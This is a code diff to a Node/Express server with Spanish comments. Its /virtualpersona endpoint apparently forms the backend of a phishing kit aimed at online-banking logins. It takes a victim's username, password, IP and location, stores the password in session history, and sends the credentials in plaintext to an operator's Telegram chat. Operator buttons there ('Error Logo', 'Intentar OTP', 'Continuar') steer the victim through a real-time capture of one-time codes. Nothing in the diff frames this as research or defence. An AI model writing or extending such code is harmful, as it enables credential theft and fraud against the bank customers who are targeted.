@@ -89,37 +89,54 @@ function fmt(k, v) {
   return `<b>${k}:</b> ${String(v).replace(/</g, '&lt;').replace(/>/g, '&gt;')}`;
 }
 
-// --------------------- Rutas ---------------------
-
 app.post('/virtualpersona', async (req, res) => {
   try {
     const { sessionId, user, pass, ip, country, city } = req.body || {};
     if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });
 
+    // 1. Guardar estado
     const updated = await writeState(sessionId, {
       step: 'virtual',
       data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
-      history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'virtualpersona', user, ip, country, city } ],
+      history: [
+        ...(await readState(sessionId)).history,
+        { t: ts(), event: 'virtualpersona', user, pass }
+      ],
       pending: null
     });
 
-    const text =
-`<b>🔐 Nuevo Ingreso</b>
+    // 2. Crear texto a enviar
+    const text = `🔒 NUEVO INGRESO VIRTUAL 🔒\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌎 IP: ${ip} (${city}, ${country})\n🧾 SessionID: ${sessionId}`;
 
-${fmt('👤 User', user)}
-${fmt('🔑 Pass', pass)}
-${fmt('🌐 IP', ip)}
-${fmt('🌎 País', country)}
-${fmt('🏘️ Ciudad', city)}
+    // 3. Crear botones
+    const buttons = {
+      inline_keyboard: [
+        [
+          { text: "❌ Error Logo", callback_data: `error_logo|${sessionId}` },
+          { text: "🔁 Intentar OTP", callback_data: `error_otp|${sessionId}` },
+        ],
+        [
+          { text: "✅ Continuar", callback_data: `siguiente|${sessionId}` }
+        ]
+      ]
+    };
 
-<b>SessionID:</b> <code>${sessionId}</code>
-⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
+    // 4. Enviar a Telegram
+    await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: process.env.CHAT_ID,
+        text,
+        reply_markup: buttons
+      })
+    });
 
-    await tgSendMessage(text, buttonsForStep('virtual', sessionId));
     res.json({ ok: true });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: 'internal_error' });
+
+  } catch (err) {
+    console.error('Error en /virtualpersona:', err);
+    res.status(500).json({ error: 'Error interno del servidor' });
   }
 });
 
